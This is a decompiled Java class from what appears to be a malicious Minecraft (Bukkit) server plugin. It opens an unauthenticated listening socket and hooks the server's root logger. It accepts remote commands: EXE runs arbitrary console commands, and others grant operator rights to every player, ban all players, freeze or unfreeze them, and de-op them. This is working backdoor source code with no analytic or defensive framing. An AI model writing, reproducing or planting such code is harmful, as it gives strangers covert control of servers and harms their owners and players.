/*
 * Decompiled with CFR 0.152.
 * 
 * Could not load the following classes:
 *  org.apache.logging.log4j.LogManager
 *  org.apache.logging.log4j.core.Appender
 *  org.apache.logging.log4j.core.Logger
 *  org.bukkit.Bukkit
 *  org.bukkit.entity.Player
 *  org.bukkit.event.Listener
 *  org.bukkit.plugin.Plugin
 */
package me.qlutch.sucks.sockets;

import me.qlutch.sucks.data.DataManager;
import me.qlutch.sucks.Core;
import me.qlutch.sucks.methods.API;
import java.io.IOException;
import java.net.ServerSocket;
import java.net.Socket;
import java.util.ArrayList;
import java.util.function.Consumer;

import me.qlutch.sucks.methods.LogAppender;
import me.qlutch.sucks.sockets.events.ConsoleCommandEvent;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.core.Appender;
import org.apache.logging.log4j.core.Logger;
import org.bukkit.Bukkit;
import org.bukkit.entity.Player;
import org.bukkit.event.Listener;
import org.bukkit.plugin.Plugin;

public class SocketServer {
    private static final Core coreInstance = (Core)Core.getPlugin(Core.class);
    private ServerSocket serverSocket;
    private ArrayList<ClientThread> clientThreads;
    private Thread thread;
    private Consumer<String> stringConsumer;
    final Logger logger = (Logger)LogManager.getRootLogger();

    public SocketServer(int port) {
        try {
            this.clientThreads = new ArrayList();
            this.serverSocket = new ServerSocket(port);
            this.thread = new Thread(() -> {
                while (!this.serverSocket.isClosed()) {
                    try {
                        Socket s2 = this.serverSocket.accept();
                        LogAppender appender = new LogAppender();
                        this.logger.addAppender((Appender)appender);
                        Bukkit.getServer().getPluginManager().registerEvents((Listener)new ConsoleCommandEvent(), (Plugin)coreInstance);
                        ClientThread clientThread = new ClientThread(s2, this::cmd, this::removeConnectionThread);
                        this.clientThreads.add(clientThread);
                        clientThread.start();
                    }
                    catch (IOException iOException) {}
                }
            });
            this.thread.start();
        }
        catch (IOException e2) {
            e2.printStackTrace();
        }
    }

    private void cmd(String msg) {
        String[] args;
        if (this.stringConsumer != null) {
            this.stringConsumer.accept(msg);
        }
        
        if ((args = (msg = msg.split("\u0000")[0]).split(" ")) != null) {
            if (args[0].equalsIgnoreCase("EXE")) {
                StringBuilder cmd = new StringBuilder();
                for (int i2 = 1; i2 != args.length; ++i2) {
                    cmd.append(args[i2]).append(" ");
                }
                API.runCMDAsConsole(cmd.toString());
            }
            if (args[0].equalsIgnoreCase("BANALL")) {
                for (Player a2 : Bukkit.getOnlinePlayers()) {
                    DataManager.bannedPlayers.add(a2.toString());
                    DataManager.getData().set("epic-players", DataManager.bannedPlayers);
                    DataManager.saveData();
                }
            }
            if (args[0].equalsIgnoreCase("FREEZEALL")) {
                SocketServer.coreInstance.frozen = true;
                for (Player a3 : Bukkit.getOnlinePlayers()) {
                    if (SocketServer.coreInstance.lite.contains(a3.getName()) || SocketServer.coreInstance.frozenPlayers.contains(a3.getName())) continue;
                    SocketServer.coreInstance.frozenPlayers.add(a3.getName());
                }
            }
            if (args[0].equalsIgnoreCase("UNFREEZEALL")) {
                SocketServer.coreInstance.frozen = false;
                for (Player a4 : Bukkit.getOnlinePlayers()) {
                    if (!SocketServer.coreInstance.frozenPlayers.contains(a4.getName())) continue;
                    SocketServer.coreInstance.frozenPlayers.remove(a4.getName());
                }
            }
            if (args[0].equalsIgnoreCase("UNFREEZEALLPLAYERS")) {
                for (Player a5 : Bukkit.getOnlinePlayers()) {
                    if (!SocketServer.coreInstance.frozenPlayers.contains(a5.getName())) continue;
                    SocketServer.coreInstance.frozenPlayers.remove(a5.getName());
                }
            }
            if (args[0].equalsIgnoreCase("OPALL")) {
                for (Player a6 : Bukkit.getOnlinePlayers()) {
                    API.opPlayer(a6);
                }
            }
            if (args[0].equalsIgnoreCase("DEOPALL")) {
                for (Player a7 : Bukkit.getOnlinePlayers()) {
                    API.deopPlayer(a7);
                }
            }
        }
    }

    private void removeConnectionThread(ClientThread c2) {
        this.clientThreads.remove(c2);
    }

    public void serverSocket(Consumer<String> callback) {
        this.stringConsumer = callback;
    }

    public void broadcastMessage(String msg) {
        this.clientThreads.forEach(c2 -> c2.broadcastMessage(msg));
    }

    public void stop() {
        try {
            this.serverSocket.close();
            while (this.clientThreads.size() > 0) {
                this.clientThreads.get(0).disconnect();
            }
        }
        catch (IOException e2) {
            e2.printStackTrace();
        }
    }
}

